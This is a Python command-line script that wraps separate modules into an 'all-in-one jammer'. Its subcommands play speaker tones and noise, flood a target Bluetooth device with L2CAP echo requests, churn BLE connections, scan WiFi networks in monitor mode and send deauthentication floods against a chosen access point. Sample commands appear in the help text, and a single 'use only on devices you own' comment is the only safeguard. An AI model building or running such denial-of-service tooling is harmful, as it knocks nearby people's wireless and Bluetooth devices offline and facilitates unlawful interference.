#!/usr/bin/env python3
# language: Python 3.8+, file: jammer.py, target: Linux
# ALL-IN-ONE jammer: audio (speaker test/tone/noise) + Bluetooth DoS + WiFi deauth.
# Wraps speaker_jammer.py, bt_jammer.py, pc_jammer.py — keep all files together.
# Deps: numpy, sounddevice(optional), bluez, aircrack-ng(optional per feature).
# Use only on devices you own.

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import speaker_jammer
import bt_jammer
import pc_jammer


def cmd_audio(args):
    ns = argparse.Namespace(
        mode=args.mode, freq=args.freq, freq2=args.freq2,
        duration=args.duration, amp=args.amp, kind=args.kind,
        on_ms=args.on_ms, off_ms=args.off_ms, device=args.device)
    print(f"[*] audio {args.mode} {args.duration}s @{args.freq}Hz amp={args.amp}")
    print("[*] Ctrl+C to stop")
    try:
        data = speaker_jammer.build_signal(ns)
        speaker_jammer.play(data, device=args.device)
    except KeyboardInterrupt:
        print("\n[*] stopped")


def cmd_bt_scan(args):
    bt_jammer.cmd_scan(argparse.Namespace(time=args.time))


def cmd_bt_flood(args):
    bt_jammer.cmd_flood(argparse.Namespace(
        target=args.target, workers=args.workers, interval=args.interval))


def cmd_bt_ble(args):
    bt_jammer.cmd_ble_flood(argparse.Namespace(target=args.target))


def cmd_wifi_scan(args):
    pc_jammer.euid_check()
    iface = pc_jammer.pick_interface(args.iface)
    mon = pc_jammer.ensure_monitor(iface)
    pc_jammer.scan(mon, args.time)


def cmd_wifi_attack(args):
    pc_jammer.euid_check()
    iface = pc_jammer.pick_interface(args.iface)
    mon = pc_jammer.ensure_monitor(iface)
    pc_jammer.attack(mon, args.bssid, args.client, args.count, args.ignore_negative)


def main():
    p = argparse.ArgumentParser(
        prog="jammer.py",
        description="All-in-one jammer: audio + Bluetooth + WiFi",
        epilog="examples:\n"
               "  jammer.py audio tone -f 8000 -d 15        # 8kHz speaker tone\n"
               "  jammer.py audio test -d 12                # speaker range test\n"
               "  jammer.py bt-scan -t 20                    # find BT devices\n"
               "  jammer.py bt-flood AA:BB:CC:DD:EE:FF -w 8  # L2CAP flood\n"
               "  jammer.py bt-ble AA:BB:CC:DD:EE:FF         # BLE connect churn\n"
               "  jammer.py wifi-scan -i wlan0 -t 20         # find WiFi APs (sudo)\n"
               "  jammer.py wifi-attack -b AA:BB:.. -i wlan0 # deauth (sudo)",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd", required=True)

    a = sub.add_parser("audio", help="speaker jammer / audio test")
    a.add_argument("mode", nargs="?", default="tone",
                   choices=["tone", "sweep", "noise", "bursts", "test"])
    a.add_argument("-f", "--freq", type=float, default=8000,
                   help="Hz, default 8000")
    a.add_argument("--freq2", type=float, default=20000, help="sweep end Hz")
    a.add_argument("-d", "--duration", type=float, default=10.0)
    a.add_argument("--amp", type=float, default=0.7)
    a.add_argument("--kind", choices=["white", "pink"], default="white")
    a.add_argument("--on-ms", type=int, default=60)
    a.add_argument("--off-ms", type=int, default=180)
    a.add_argument("--device", type=int, default=None)
    a.set_defaults(func=cmd_audio)

    b = sub.add_parser("bt-scan", help="scan nearby Bluetooth devices")
    b.add_argument("-t", "--time", type=int, default=15)
    b.set_defaults(func=cmd_bt_scan)

    bf = sub.add_parser("bt-flood", help="L2CAP echo flood (Classic BT)")
    bf.add_argument("target", help="target BDADDR")
    bf.add_argument("-w", "--workers", type=int, default=6)
    bf.add_argument("-i", "--interval", type=float, default=0.01)
    bf.set_defaults(func=cmd_bt_flood)

    bb = sub.add_parser("bt-ble", help="BLE connect/disconnect churn")
    bb.add_argument("target", help="target BLE BDADDR")
    bb.set_defaults(func=cmd_bt_ble)

    ws = sub.add_parser("wifi-scan", help="scan WiFi APs (needs sudo + monitor NIC)")
    ws.add_argument("-i", "--iface", default=None)
    ws.add_argument("-t", "--time", type=int, default=20)
    ws.set_defaults(func=cmd_wifi_scan)

    wa = sub.add_parser("wifi-attack", help="deauth flood a BSSID (sudo)")
    wa.add_argument("-b", "--bssid", required=True)
    wa.add_argument("-c", "--client", default=None)
    wa.add_argument("-n", "--count", type=int, default=0)
    wa.add_argument("-i", "--iface", default=None)
    wa.add_argument("--ignore-negative", action="store_true")
    wa.set_defaults(func=cmd_wifi_attack)

    args = p.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
